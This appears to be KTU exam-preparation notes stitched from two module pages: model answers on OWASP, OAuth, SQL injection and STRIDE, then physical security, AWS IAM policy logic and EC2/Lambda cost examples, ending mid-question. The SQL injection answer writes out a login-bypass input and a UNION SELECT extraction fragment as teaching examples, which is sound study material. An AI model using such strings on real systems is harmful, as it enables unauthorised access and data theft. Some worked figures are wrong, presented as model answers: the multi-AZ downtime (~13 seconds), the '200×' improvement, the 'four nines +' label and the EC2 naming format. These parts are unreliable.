5. **A05 — Security Misconfiguration (0.5 mark for description + 0.5 for mitigation):** Default credentials, open S3 buckets, verbose error messages. **Mitigation:** Automated configuration scanning, hardened baselines (CIS Benchmarks), remove unused features, and patch regularly.

(For brevity in the answer sheet, the student can write 5 of 10 in detail and list the remaining 5 briefly.)

**Model Solution (b) — OAuth 2.0 Flow (7 marks):**

**Diagram (3 marks):** Refer to the sequence diagram in Section 4.2.

**Flow Description (2 marks):** The user initiates login. The client redirects to the Authorization Server with `client_id`, `scope`, and `redirect_uri`. The user authenticates and grants consent. The Authorization Server issues an **authorization code** to the client's redirect URI. The client exchanges this code (via secure back-channel) for an **access token** and **refresh token**. The access token is used in the `Authorization: Bearer` header for API calls. The resource server validates the token and returns the protected resource.

**Two Security Risks & Mitigations (2 marks):**

1. **Authorization Code Interception:** An attacker on the same network could steal the code from the redirect URI. **Mitigation:** Mandate **PKCE (Proof Key for Code Exchange)** and use `state` parameter for CSRF protection. The redirect URI must be exact-match validated.

2. **Access Token Leakage via XSS or Log Exposure:** Tokens stored in browser localStorage are vulnerable to XSS. **Mitigation:** Store tokens in **HttpOnly, Secure, SameSite=Strict cookies**; use short token TTLs (5–15 minutes); implement token rotation; deploy strict **Content Security Policy (CSP)** headers.

---

**Question B (14 Marks) — [KTU University Exam — June 2023]**

**(a)** What is **SQL Injection**? Demonstrate an attack scenario with a vulnerable code snippet. Explain how **parameterized queries** prevent it. **(7 marks)**

**(b)** Describe the **CIA Triad** and **STRIDE** threat model. Compare their applicability in application security. **(7 marks)**

---

**Model Solution (a) — SQL Injection (7 marks):**

**Definition (1 mark):** SQL Injection is a code injection attack where an attacker inserts malicious SQL statements into an input field that is later executed by the back-end database, leading to unauthorized data access, modification, or destruction.

**Vulnerable Code (2 marks):**

Suppose a login form accepts a username and password. A vulnerable application might construct the query as:

```sql
SELECT * FROM users WHERE username = '<input_username>' AND password = '<input_password>';
```

If a user enters the username:

```text
admin' --
```

The resulting SQL becomes:

```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...';
```

The `--` is a SQL comment, causing the password check to be bypassed. The attacker is logged in as `admin` without knowing the password.

**Attack Consequences (2 marks):** Data exfiltration (`UNION SELECT credit_card FROM payments`), authentication bypass, data modification (`UPDATE users SET role='admin'`), and even remote command execution on certain database engines.

**Mitigation — Parameterized Queries (2 marks):** Use prepared statements with bound parameters. The database engine treats user input strictly as data, never as executable SQL:

```sql
PREPARE stmt FROM 'SELECT * FROM users WHERE username = ? AND password = ?';
EXECUTE stmt USING @username, @password_hash;
```

Additional defenses: input validation, stored procedures, least-privilege DB accounts, and WAF rules.

---

**Model Solution (b) — CIA Triad vs STRIDE (7 marks):**

**CIA Triad (3 marks):** The foundational model of information security:

- **Confidentiality:** Ensuring data is accessible only to authorized parties (encryption, access control).
- **Integrity:** Ensuring data is not tampered with (hashing, digital signatures).
- **Availability:** Ensuring systems are accessible when needed (redundancy, DDoS protection, backups).

**STRIDE Model (3 marks):** Developed by Microsoft, STRIDE categorizes threats into six classes:

- **S**poofing identity
- **T**ampering with data
- **R**epudiation
- **I**nformation disclosure
- **D**enial of service
- **E**levation of privilege

**Comparison (1 mark):**

| Aspect | CIA Triad | STRIDE |
|---|---|---|
| **Purpose** | Defines *security goals* | Categorizes *threat types* |
| **Perspective** | Defender's objectives | Attacker's techniques |
| **Origin** | Foundational (1970s) | Microsoft (1999) |
| **Use Case** | Security policy & requirements | Threat modeling during design |
| **Complementary?** | Yes — STRIDE helps achieve CIA | Yes — STRIDE attacks violate CIA properties |

> [!WARNING]
> **KTU Examiner's Valuation Warning — Where Students Lose Marks:**
> 1. **Confusing CIA Triad with AAA (Authentication, Authorization, Accounting)** — they are related but distinct.
> 2. **Listing STRIDE without examples** — always map each STRIDE category to a real attack for full marks.
> 3. **Writing vague SQL Injection defenses** like "use validation" — be specific: *parameterized queries with bound variables, ORM, principle of least privilege on DB user*.
> 4. **Skipping the diagram in OAuth questions** — a flow diagram is worth 2–3 marks in a 7-mark sub-question.
> 5. **Forgetting to mention HTTPS/TLS** when discussing data-in-transit security.

---

## 🚀 Topic Recap & Important Things to Remember (Last-Minute Revision)

- ✅ **Application Level Security** operates at **OSI Layer 7** and protects application logic, not just network packets.
- ✅ The **OWASP Top 10 (2021)** is the *de facto* industry standard — memorize A01 through A10 with one mitigation each.
- ✅ **Three Pillars of Identity Security:** Authentication → Authorization → Accounting (Auditing).
- ✅ **Three Authentication Factors:** Knowledge (password), Possession (token), Inherence (biometric). **MFA = ≥ 2 factors**.
- ✅ **Defense in Depth** = multiple independent security layers. No single control is sufficient.
- ✅ **Encryption Standards:** TLS 1.2+ (transit), AES-256 (rest), bcrypt/Argon2 (passwords).
- ✅ **SQL Injection defense:** Parameterized queries (prepared statements) — never string concatenation.
- ✅ **XSS defense:** Output encoding + Content Security Policy (CSP) headers.
- ✅ **CSRF defense:** Anti-CSRF tokens + `SameSite=Strict` cookies.
- ✅ **SSRF defense:** URL allow-listing + network segmentation + IMDSv2 on cloud.
- ✅ **OAuth 2.0** delegates authorization without sharing passwords; **PKCE** is mandatory for public clients.
- ✅ **JWT** tokens must use **short TTL**, **signed with HS256/RS256**, and validated for `iss`, `aud`, `exp`, `nbf` claims.
- ✅ **CVSS v3.1 Base Score** ranges from **0.0 (none) to 10.0 (critical)**.
- ✅ **STRIDE** is used during *design* (threat modeling); **CIA Triad** defines *security goals*.
- ✅ **Secure SDLC** integrates security from Requirements → Design → Code → Test → Deploy → Monitor (shift-left).
- ✅ **Principle of Least Privilege (PoLP):** Every user, process, and system component has only the minimum permissions necessary.
- ✅ **Logging must be centralized** (e.g., SIEM), with **immutability** to prevent attacker tampering.
- ✅ **Default-deny** is always safer than default-allow for both firewalls and authorization policies.
- ✅ **Patch SLA:** Critical CVEs patched within **7 days**; High within **30 days** (industry standard).

<!-- SECTION_5_END -->

> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**

> - **Module:** Module Module 4
> - **Topic:** Security of the Physical Systems. Identity & Access Management - Access Control. Amazon Web Services (AWS) - AWS Ecosystem - Computing Services

<!-- SECTION_1_START -->

# 📘 MODULE 4: Physical Security, IAM & AWS Computing Services

## 1. Core Technical Definition & Intuitive Overview

### 1.1 Security of the Physical Systems (Data Center Security)

> [!IMPORTANT]
> **Formal Definition (KTU 2024 Syllabus Aligned):**
> *Physical security in cloud computing refers to the layered set of measures, controls, and protocols designed to protect the underlying physical infrastructure — data centers, servers, networking equipment, and storage media — from physical threats, unauthorized access, environmental hazards, and insider attacks. It forms the foundational layer of the cloud security stack upon which logical (software-defined) security is built.*

In the **KTU 2024 Scheme**, physical security is treated as the *root of trust* — if the physical layer is compromised, every higher layer (network, application, data) collapses.

#### 🔑 Key Pillars of Physical Security (Defense-in-Depth Model)

| Layer | Control | Real-World Analogy |
|-------|---------|-------------------|
| **Perimeter** | Fencing, bollards, vehicle barriers | The outer compound wall of a bank vault |
| **Building** | Mantraps, biometric access, security guards | The bank's front door with armed guards |
| **Server Room** | Badge access, CCTV, locked cages | The vault room itself |
| **Rack / Hardware** | Tamper-evident seals, asset tracking | Individual safety deposit boxes |
| **Environmental** | Fire suppression, HVAC, flood sensors | Climate control that protects the artwork |
| **Media** | Secure shredding, degaussing, crypto-erase | Destroying old paper records |

> [!NOTE]
> **Industry Standard Metrics:**
> - **Uptime Tier:** **Tier IV** (99.995% availability) — 26.3 minutes downtime/year.
> - **Biometric FAR (False Acceptance Rate):** **0.0001%** (1 in 1,000,000).
> - **CCTV Retention:** Typically **90 days** minimum, **1 year** for regulated workloads.

#### 🏢 Real-World Analogy: The "Bank Vault" Mental Model

Imagine a bank vault protecting gold bars. The gold (your data) is useless if the vault door (encryption) is strong but the building is unguarded, the walls are thin, or anyone can walk in. Physical security is the **building, the walls, the guards, the CCTV, and the vault door combined**. AWS, Azure, and GCP all build "fortress" data centers — for example, AWS regions are built in undisclosed, hardened locations, often in former military bunkers or disaster-resistant zones.

---

### 1.2 Identity & Access Management (IAM) — Access Control

> [!IMPORTANT]
> **Formal Definition:**
> *Identity and Access Management (IAM) is the discipline and framework of policies, processes, and technologies that ensure the right individuals (identities) get the right access to the right resources, at the right time, for the right reasons. Access Control is the operational mechanism within IAM that enforces these decisions.*

#### 🧠 Conceptual Analogy: The "Hotel Key Card" Model

Think of a hotel where each guest receives a **key card** (identity) that only opens:
- Their assigned room (specific resource)
- Only during their stay (time-bound)
- Only certain floors (scope-based)
- The guest can use the gym and pool (role-based access) but not the staff-only kitchen.

IAM in cloud works **exactly the same way**:
- **Identity (the guest)** = IAM User, Role, or Service Principal
- **Key card (credentials)** = Password, Access Key, MFA token
- **Room access policy** = JSON policy document
- **Hotel manager** = IAM service that issues/revokes credentials
- **Audit log** = The hotel's check-in/check-out register (CloudTrail)

---

### 1.3 AWS (Amazon Web Services) — The Cloud Platform

> [!IMPORTANT]
> **Formal Definition:**
> *AWS is a comprehensive, evolving cloud computing platform provided by Amazon, offering over 200 fully featured services from data centers globally. It provides on-demand compute, storage, networking, database, analytics, ML, IoT, and security services through a pay-as-you-go pricing model with global infrastructure spanning Regions, Availability Zones, and Edge Locations.*

#### 🌐 AWS Ecosystem — The 5-Layer Stack

```
┌─────────────────────────────────────────┐
│  Layer 5: Application Services          │  ← SQS, SES, Cognito
├─────────────────────────────────────────┤
│  Layer 4: Platform Services             │  ← RDS, EMR, SageMaker
├─────────────────────────────────────────┤
│  Layer 3: Compute Services              │  ← EC2, Lambda, ECS
├─────────────────────────────────────────┤
│  Layer 2: Storage & Networking          │  ← S3, EBS, VPC
├─────────────────────────────────────────┤
│  Layer 1: Global Infrastructure         │  ← Regions, AZs, Edge
└─────────────────────────────────────────┘
```

**AWS Global Infrastructure (2024-2026 metrics, current at knowledge cutoff):**
- **33+ Geographic Regions**
- **100+ Availability Zones (AZs)**
- **600+ Edge Locations / CloudFront PoPs**
- **32+ Regional Edge Caches**

> [!NOTE]
> An **Availability Zone (AZ)** is one or more discrete data centers with redundant power, networking, and connectivity in an AWS Region. An AZ is a **physically separate** facility connected to other AZs via **low-latency (<2 ms) private fiber links**.

---

### 1.4 AWS Computing Services — The Heart of the Platform

> [!IMPORTANT]
> **Formal Definition:**
> *AWS Computing Services constitute the portfolio of virtualized, containerized, and serverless compute offerings that allow customers to run applications and workloads without managing the underlying physical hardware. They span four paradigms: Virtual Machines (VMs), Containers, Serverless Functions, and Managed Orchestration.*

#### 🛠️ The Four Compute Paradigms

| Paradigm | AWS Service | Analogy | Control Level |
|----------|-------------|---------|---------------|
| **Virtual Machines (IaaS)** | **EC2** | Renting a full apartment | Highest |
| **Containers (CaaS)** | **ECS, EKS, Fargate** | Renting furnished rooms | High |
| **Serverless (FaaS)** | **Lambda** | Renting a hotel room per night | Medium |
| **Platform (PaaS)** | **Elastic Beanstalk, App Runner** | Moving into a serviced apartment | Lowest |
| **Edge / Hybrid** | **Outposts, Snowball** | Living in your own house with cloud utilities | Varies |

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->

# 2. Deep Theoretical Analysis & KTU High-Yield Formula Sheet

## 2.1 The AWS Shared Responsibility Model

> [!CRITICAL]
> **The Golden Rule of Cloud Security:**
> *"AWS is responsible for the security **OF** the cloud (the infrastructure). The customer is responsible for security **IN** the cloud (the data, OS, applications, and access)."*

```
┌──────────────────────────────────────────────────────┐
│                  CUSTOMER RESPONSIBILITY             │
│  ┌────────────────────────────────────────────────┐  │
│  │  • Data encryption (at rest & in transit)      │  │
│  │  • Identity & Access Management (IAM)          │  │
│  │  • Operating System patching                   │  │
│  │  • Network & Firewall configuration            │  │
│  │  • Application-level security                  │  │
│  └────────────────────────────────────────────────┘  │
├──────────────────────────────────────────────────────┤
│                   AWS RESPONSIBILITY                 │
│  ┌────────────────────────────────────────────────┐  │
│  │  • Physical data center security               │  │
│  │  • Hardware & infrastructure maintenance       │  │
│  │  • Hypervisor security                         │  │
│  │  • Network infrastructure                      │  │
│  │  • Managed service patching (RDS, Lambda)      │  │
│  └────────────────────────────────────────────────┘  │
└──────────────────────────────────────────────────────┘
```

**Key Insight:** The split **moves** depending on the service. For **EC2** (IaaS), you patch the OS. For **Lambda** (serverless), AWS does everything — you only bring code.

---

## 2.2 Identity & Access Management (IAM) — Access Control Pillars

### 🔐 The Four IAM Building Blocks

1. **IAM Users** — A permanent identity representing a person or service.
2. **IAM Groups** — A collection of users sharing the same policies.
3. **IAM Roles** — A *temporary* identity that can be assumed by users, services, or external accounts (no long-term credentials).
4. **IAM Policies** — JSON documents defining permissions (the *what*).

### 📜 Anatomy of an IAM Policy Document

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowS3ReadOnSpecificBucket",
      "Effect": "Allow",
      "Action": [
        "s3:GetObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::my-bucket",
        "arn:aws:s3:::my-bucket/*"
      ],
      "Condition": {
        "IpAddress": {
          "aws:SourceIp": "203.0.113.0/24"
        },
        "Bool": {
          "aws:MultiFactorAuthPresent": "true"
        }
      }
    }
  ]
}
```

| Element | Purpose | KTU Significance |
|---------|---------|------------------|
| `Version` | Policy language version | Always use `2012-10-17` |
| `Sid` | Statement ID (optional) | For human readability |
| `Effect` | `Allow` or `Deny` | Deny always wins |
| `Action` | API calls allowed/denied | `service:Action` format |
| `Resource` | ARN of the target | `*` means everything |
| `Condition` | Contextual constraints | MFA, IP, time, tags |

---

## 2.3 Policy Evaluation Logic (THE Algorithm)

> [!IMPORTANT]
> **KTU Frequently Asked Concept:** How does AWS decide if a request is allowed?

```
                  ┌──────────────────────────┐
                  │  Incoming API Request    │
                  └─────────────┬────────────┘
                                ▼
                  ┌──────────────────────────┐
                  │  Step 1: Authentication │
                  │  (Who is making call?)   │
                  └─────────────┬────────────┘
                                ▼
                  ┌──────────────────────────┐
                  │  Step 2: Request Context │
                  │  (Time, IP, MFA, etc.)   │
                  └─────────────┬────────────┘
                                ▼
                  ┌──────────────────────────┐
                  │  Step 3: Evaluate ALL    │
                  │  applicable policies:    │
                  │  • Identity-based        │
                  │  • Resource-based        │
                  │  • IAM Permissions       │
                  │    Boundaries            │
                  │  • Service Control       │
                  │    Policies (SCPs)       │
                  │  • Session Policies      │
                  └─────────────┬────────────┘
                                ▼
                  ┌──────────────────────────┐
                  │  Step 4: Apply Logic     │
                  │  • Explicit DENY → ❌    │
                  │  • Default DENY (no Allow)│
                  │  • Any ALLOW → ✅         │
                  └──────────────────────────┘
```

**The Three Decision Outcomes:**
1. **Deny (Explicit)** → A `Deny` statement exists → **Always Rejected**.
2. **Deny (Implicit/Default)** → No `Allow` statement matches → **Always Rejected**.
3. **Allow** → At least one `Allow` matches and no `Deny` matches → **Permitted**.

## 2.4 AWS Computing Services — Detailed Taxonomy

### 2.4.1 Amazon EC2 (Elastic Compute Cloud) — The Workhorse

> [!IMPORTANT]
> **EC2 = Elastic Compute Cloud = Resizable virtual servers in the cloud.**

#### EC2 Instance Types (The "Family-Size-Generation" Naming Convention)

```
Format: [Family] + [Size Number] + [Generation][optional]
Example: m5.large
         │   │       │
         │   │       └─ Generation (5th gen Intel Xeon)
         │   └───────── Size (large: 2 vCPU, 8 GB RAM)
         └───────────── Family (M = General Purpose)
```

| Family | Full Name | Use Case | Example |
|--------|-----------|----------|---------|
| **T** | Burstable | Variable workloads (web servers, dev) | `t3.micro` |
| **M** | General Purpose | Balanced (app servers) | `m5.large` |
| **C** | Compute Optimized | CPU-bound (batch, gaming) | `c5.xlarge` |
| **R** | Memory Optimized | RAM-bound (in-memory DB) | `r5.2xlarge` |
| **X** | Memory Optimized | Extreme RAM (SAP HANA) | `x1e.32xlarge` |
| **P / G** | GPU / Graphics | ML training, graphics | `p4d.24xlarge` |
| **I / D** | Storage Optimized | High IOPS, dense storage | `i3.large` |

#### EC2 Pricing Models (KTU High-Yield)

| Model | Commitment | Discount | Best For |
|-------|-----------|----------|----------|
| **On-Demand** | None | 0% | Short, unpredictable |
| **Reserved (RI)** | 1 or 3 years | Up to **75%** | Steady-state |
| **Savings Plans** | 1 or 3 years | Up to **72%** | Flexible compute |
| **Spot** | None (can be reclaimed) | Up to **90%** | Fault-tolerant, batch |
| **Dedicated Host** | Physical host | Varies | Compliance, BYOL |

#### EC2 Core Components

- **AMI (Amazon Machine Image):** Template with OS + software.
- **Instance Type:** Hardware configuration (CPU, RAM, network).
- **EBS (Elastic Block Store):** Persistent block storage (network-attached).
- **Instance Store:** Temporary storage (lost on stop/terminate).
- **Security Group:** Virtual firewall at the **instance level** (stateful).
- **Key Pair:** Public-key cryptography for SSH login.
- **Elastic IP:** Static, public IPv4 address.
- **User Data:** Script run at first launch (bootstrap).

---

### 2.4.2 AWS Lambda — Serverless Functions as a Service (FaaS)

> [!IMPORTANT]
> **Lambda = Run code without thinking about servers. Pay only for compute time consumed.**

#### Lambda Execution Model

```
┌──────────────────────────────────────────────────────────┐
│                    LAMBDA LIFECYCLE                       │
│                                                          │
│  1. Trigger (Event Source)                               │
│     → API Gateway, S3, SQS, DynamoDB, Schedule          │
│                       │                                  │
│                       ▼                                  │
│  2. Cold Start or Warm Start                             │
│     → Cold: ~200-500 ms (init code, download)            │
│     → Warm: <10 ms                                       │
│                       │                                  │
│                       ▼                                  │
│  3. Execution Environment                                │
│     → Container per concurrent execution                 │
│     → 128 MB - 10,240 MB RAM                            │
│     → Max 15 min execution                               │
│                       │                                  │
│                       ▼                                  │
│  4. Billing (per 1 ms)                                   │
│     → GB-seconds consumed                                │
│     → Number of requests                                 │
│                       │                                  │
│                       ▼                                  │
│  5. Response / Log to CloudWatch                         │
└──────────────────────────────────────────────────────────┘
```

**Lambda Limits (KTU-Worthy Facts):**
- **Max execution time:** **15 minutes** (900 seconds)
- **Max memory allocation:** **10,240 MB** (10 GB)
- **Deployment package size:** **50 MB (zipped)**, **250 MB (unzipped)**
- **Container image size:** Up to **10 GB**
- **Concurrent executions (default):** **1,000 per region** (can be increased)

# 3. Step-by-Step Derivations & Analytical Matrix

## 3.1 Derivation: The Policy Evaluation Truth Table

The AWS policy evaluation algorithm is a logical decision procedure. We can formally model it as a Boolean function over policy statements.

### Notation

Let:
- $P = \{P_1, P_2, \ldots, P_n\}$ be the set of policy statements applicable to the request.
- Each statement $P_i$ has an `Effect` $\in \{\text{Allow}, \text{Deny}\}$.
- Each statement has a `Condition` $C_i$ that evaluates to True or False.
- A statement matches if $\text{Effect}_i = X$ AND $C_i = \text{True}$.

### Logical Formulation

$$
\text{Result}(R) = 
\begin{cases}
\text{EXPLICIT\_DENY} & \text{if } \exists i : (P_i.\text{Effect} = \text{Deny}) \land (P_i.C_i = \text{True}) \\
\text{ALLOW} & \text{if } \neg(\exists i : P_i.\text{Effect} = \text{Deny} \land P_i.C_i = \text{True}) \\
& \quad \land (\exists j : P_j.\text{Effect} = \text{Allow} \land P_j.C_j = \text{True}) \\
\text{IMPLICIT\_DENY} & \text{otherwise}
\end{cases}
$$

In set notation:

$$
\text{Result} = 
\begin{cases}
\text{Deny}_{\text{explicit}} & \text{if } D_{\text{matched}} \neq \emptyset \\
\text{Allow} & \text{else if } A_{\text{matched}} \neq \emptyset \\
\text{Deny}_{\text{implicit}} & \text{otherwise}
\end{cases}
$$

where:
- $D_{\text{matched}} = \{P_i \in P : \text{Effect}(P_i) = \text{Deny} \land \text{Cond}(P_i) = \text{True}\}$
- $A_{\text{matched}} = \{P_i \in P : \text{Effect}(P_i) = \text{Allow} \land \text{Cond}(P_i) = \text{True}\}$

### Truth Table Derivation

| Explicit Deny Match? | Allow Match? | Final Decision |
|:---:|:---:|:---:|
| Yes | Yes | **Deny** (Deny always wins) |
| Yes | No | **Deny** |
| No | Yes | **Allow** |
| No | No | **Implicit Deny** |

**Key Boolean Identity:**

$$
\text{Allow}_{\text{final}} = (\neg D_{\text{matched}}) \land (A_{\text{matched}})
$$

This is the **AND-NOT** rule — there must be **no matched denies** AND **at least one matched allow**.

---

## 3.2 Analytical Matrix: Comparing AWS Compute Services

### Decision Matrix for Choosing a Compute Service

| **Requirement** | **EC2** | **Lambda** | **ECS** | **EKS** | **Beanstalk** |
|-----------------|:---:|:---:|:---:|:---:|:---:|
| Full OS control | ✅ | ❌ | ⚠️ (with EC2 launch type) | ⚠️ (with EC2 nodes) | ⚠️ |
| Run any language | ✅ | ⚠️ (supported runtimes) | ✅ | ✅ | ✅ |
| Long-running processes (>15 min) | ✅ | ❌ | ✅ | ✅ | ✅ |
| Bursty / event-driven | ❌ (waste) | ✅ | ⚠️ | ⚠️ | ❌ |
| Containerized workload | ⚠️ (manual) | ❌ | ✅ | ✅ | ⚠️ |
| Kubernetes required | ❌ | ❌ | ❌ | ✅ | ❌ |
| Zero server management | ❌ | ✅ | ⚠️ (Fargate) | ⚠️ (Fargate) | ✅ |
| Pay only for execution time | ❌ (per hour) | ✅ (per ms) | ⚠️ | ⚠️ | ⚠️ |
| Custom AMIs / GPUs | ✅ | ❌ | ✅ | ✅ | ⚠️ |
| Cold start sensitivity | N/A | ⚠️ | N/A | N/A | N/A |

### EC2 Cost Calculation — Worked Example

**Scenario:** Run a `m5.large` On-Demand instance in `us-east-1` for **730 hours/month** (full month).

**Step 1: Identify base hourly rate**
For `m5.large` in `us-east-1` (On-Demand Linux): **$0.096/hour** (approximate)

**Step 2: Compute monthly cost**
$$
\text{Cost}_{\text{monthly}} = \text{Rate}_{\text{hourly}} \times \text{Hours}_{\text{month}}
$$

$$
\text{Cost}_{\text{monthly}} = \$0.096 \times 730
$$

$$
\text{Cost}_{\text{monthly}} = \$70.08
$$

**Step 3: Compare with 1-year Reserved Instance (no upfront, ~40% discount)**
$$
\text{Discount Rate} = 1 - 0.60 = 0.40
$$

$$
\text{Cost}_{\text{RI}} = \$70.08 \times (1 - 0.40) = \$70.08 \times 0.60 = \$42.05
$$

**Step 4: Savings**
$$
\text{Savings} = \$70.08 - \$42.05 = \$28.03
$$

**Step 5: Annual savings**
$$
\text{Savings}_{\text{annual}} = \$28.03 \times 12 = \$336.36
$$

---

## 3.3 Lambda Cost Calculation — Worked Example

**Scenario:** A Lambda function runs **10 million times/month**, executing for **200 ms** with **512 MB** allocated memory.

**Step 1: Calculate GB-seconds**

First, convert memory to GB:
$$
\text{Memory}_{\text{GB}} = 512 \, \text{MB} \times \frac{1 \, \text{GB}}{1024 \, \text{MB}} = 0.5 \, \text{GB}
$$

Total compute time (in seconds):
$$
\text{Time}_{\text{total}} = 10{,}000{,}000 \times 0.2 \, \text{s} = 2{,}000{,}000 \, \text{seconds}
$$

GB-seconds:
$$
\text{GB-sec} = 0.5 \times 2{,}000{,}000 = 1{,}000{,}000 \, \text{GB-sec}
$$

**Step 2: Compute cost**

Lambda free tier: **1M requests/month** and **400,000 GB-seconds/month**.

Billable requests:
$$
\text{Requests}_{\text{billable}} = 10{,}000{,}000 - 1{,}000{,}000 = 9{,}000{,}000
$$

Billable GB-seconds:
$$
\text{GB-sec}_{\text{billable}} = 1{,}000{,}000 - 400{,}000 = 600{,}000
$$

Cost (using AWS list prices):
- Requests: $9{,}000{,}000 \times \$0.20 / 1{,}000{,}000 = \$1.80$
- Compute: $600{,}000 \times \$0.0000166667 = \$10.00$

**Total:**
$$
\text{Cost}_{\text{Lambda}} = \$1.80 + \$10.00 = \$11.80
$$

---

## 3.4 Analytical Derivation: Availability Calculation

For a system deployed across **N** Availability Zones, each with availability $a$ (e.g., 0.9995):

**Single-AZ availability:**
$$
A_{\text{single}} = a
$$

**Multi-AZ with active-active load balancing** (system up if at least 1 AZ is up):
$$
A_{\text{multi}} = 1 - (1 - a)^N
$$

For **2 AZs** at $a = 0.9995$:
$$
A_{\text{multi}} = 1 - (0.0005)^2 = 1 - 2.5 \times 10^{-7} \approx 0.99999975
$$

This corresponds to **"four nines + "** of availability, equating to **~13 seconds of downtime per year** — vastly better than a single AZ.

For **3 AZs** at $a = 0.9995$:
$$
A_{\text{multi}} = 1 - (0.0005)^3 = 1 - 1.25 \times 10^{-10} \approx 0.999999999875
$$

> [!NOTE]
> **Insight:** The marginal benefit of adding a third AZ is much smaller than going from 1 → 2 AZs, but 3 AZs is the **de facto standard** for true high availability because it tolerates the failure of an entire AZ during a regional event (e.g., flood, power outage).

> [!NOTE]
> Each layer is a **fallback** if the previous one fails. An attacker must defeat *all* layers sequentially — this is the essence of defense in depth.

# 5. KTU 2024 Scheme Examination Question Bank & Topic Recap

---

## 📝 PART A — Short Answer Questions (3 Marks Each)

### **Question 1: [KTU University Exam - Dec 2023, Model Set 1]**
**Explain the AWS Shared Responsibility Model with suitable examples.**

**Model Answer (3 marks):**

The AWS Shared Responsibility Model divides security duties between AWS and the customer:

1. **AWS is responsible for "Security OF the Cloud"** — the underlying infrastructure:
   - Physical security of data centers
   - Server and hardware maintenance
   - Network infrastructure (routers, switches, fiber)
   - Hypervisor and host OS virtualization layer
   - Managed service patching (e.g., for RDS, Lambda)

2. **Customer is responsible for "Security IN the Cloud"** — the customer's data and configurations:
   - Data encryption (at rest and in transit)
   - Identity & Access Management (IAM) policies
   - Operating system patching (for EC2)
   - Security group and network configuration
   - Application-level security

**Example:** For Amazon EC2, AWS secures the physical host, hypervisor, and network. The customer must patch the guest OS, configure the security group, encrypt EBS volumes, and set IAM policies. However, for Amazon S3, AWS manages more — the customer only manages the bucket policy, IAM, and data encryption.

*(Word count: ~150 | KTU marking: 1 mark for AWS responsibility, 1 mark for customer responsibility, 1 mark for example)*

---

### **Question 2: [KTU University Exam - June 2024, Model Set 1]**
**List and briefly explain any THREE components of AWS Identity and Access Management (IAM).**

**Model Answer (3 marks):**

1. **IAM User** — A permanent identity representing a person or application that interacts with AWS. Each user has unique credentials (password for console, access keys for CLI/SDK) and attached policies.

2. **IAM Role** — A *temporary* identity with permissions that can be assumed by users, applications, or AWS services. Unlike users, roles do not have long-term credentials; AWS dynamically generates temporary session tokens.

3. **IAM Policy** — A JSON document that defines permissions (Allow or Deny) for specific AWS API actions on specific resources. Policies can be identity-based (attached to users/groups/roles) or resource-based (attached to resources like S3 buckets).

*(Bonus for mentioning Groups, Permissions Boundaries, or SCPs)*

---

## 📝 PART B — Long Answer Questions (14 Marks with Internal Choice)

> [!WARNING]
> **KTU Examiner's Pitfall Callout:** Students often lose marks in Part B by:
> - Skipping diagrams (1–2 marks lost)
> - Writing generic "AWS is secure" without naming specific services
> - Confusing Region vs Availability Zone
> - Forgetting numerical facts (e.g., Lambda's 15-min limit, AZ count)
> - Not stating the *Shared Responsibility* split clearly

---

### **PART B — QUESTION A (14 Marks)**

#### **Question: [KTU University Exam - Dec 2023, Model Paper 2]**
**(a)** Explain in detail the different layers of physical security in a cloud data center, with a neat diagram. Discuss why physical security is considered the *root of trust* in cloud computing. **(7 marks)**

**(b)** Describe the AWS Global Infrastructure hierarchy — Region, Availability Zone, Edge Location — with their roles in ensuring availability, fault tolerance, and low latency. **(7 marks)**

---

#### **Model Solution for (a) — 7 Marks**

**1. Introduction (1 mark):**
Physical security in cloud data centers is a layered defense-in-depth mechanism that protects the infrastructure from physical threats. It is the *root of trust* because all higher-layer security (network, application, data) ultimately depends on the integrity of the physical layer.

**2. The Six Layers of Physical Security (4 marks, ~0.7 each):**

| Layer | Function | Example Controls |
|-------|----------|------------------|
| **1. Perimeter** | Deters unauthorized vehicle/personnel entry | Fences (3m+), bollards, guard posts, 24×7 patrols |
| **2. Building** | Controls physical access to the facility | Mantraps, turnstiles, biometric scanners, visitor logs |
| **3. Server Room** | Restricts access to compute racks | Badge readers, anti-tailgating doors, CCTV (90-day retention) |
| **4. Rack / Hardware** | Protects individual assets | Locked cages, tamper-evident seals, asset RFID tracking |
| **5. Environmental** | Prevents damage from natural/man-made events | Fire suppression (FM-200, Novec 1230), HVAC, water leak sensors, seismic bracing |
| **6. Media / Data** | Handles end-of-life data destruction | Secure shredding, degaussing, cryptographic erasure |

**3. Why Physical Security is the Root of Trust (2 marks):**

- If a malicious actor gains physical access to a server, they can bypass ALL logical controls (firewalls, encryption, IAM).
- Hardware-level attacks (cold boot, DMA via Thunderbolt) can extract RAM contents.
- Physical tampering can install rogue hardware (keyloggers, network taps).
- The **chain of trust** in TPM/HSM chips begins at the physical layer.
- Compliance frameworks (SOC 2, ISO 27001, PCI-DSS) mandate physical controls as a baseline.

---

#### **Model Solution for (b) — 7 Marks**

**1. Region (2 marks):**
- A **Region** is a separate **geographic area** containing multiple Availability Zones (e.g., `us-east-1` in Virginia, `ap-south-1` in Mumbai).
- AWS has **33+ regions** worldwide.
- Each region is **completely independent** — data does not leave a region unless explicitly transferred.
- Regions allow customers to meet **data residency / sovereignty** requirements (e.g., GDPR in EU).

**2. Availability Zone (AZ) (2 marks):**
- An AZ is **one or more discrete data centers** with redundant power, networking, and cooling within a Region.
- AZs within a Region are connected via **low-latency (<2 ms) private fiber links**.
- Typical Region has **3 AZs** (minimum 2 for HA).
- Deploying across **multiple AZs** provides high availability and fault tolerance.

**3. Edge Location (1.5 marks):**
- An **Edge Location** (or **Point of Presence, PoP**) is a data center used by **Amazon CloudFront** (CDN) to cache content closer to end users.
- AWS has **600+ edge locations** and **32+ Regional Edge Caches**.
- Edge locations reduce **latency** for static/dynamic content delivery, video streaming, and API acceleration.
- They also host **AWS WAF, Lambda@Edge, and Route 53** for global traffic management.

**4. Availability Calculation (1.5 marks):**
For Multi-AZ deployment with 2 AZs each at 99.95%:
$$
A_{\text{multi}} = 1 - (1 - 0.9995)^2 = 1 - 2.5 \times 10^{-7} = 99.999975\%
$$

This corresponds to ~13 seconds of downtime per year — a 200× improvement over single-AZ.

---

### **PART B — QUESTION B (14 Marks) — Alternative Choice**

#### **Question: [KTU University Exam - June 2024, Model Paper 1]**
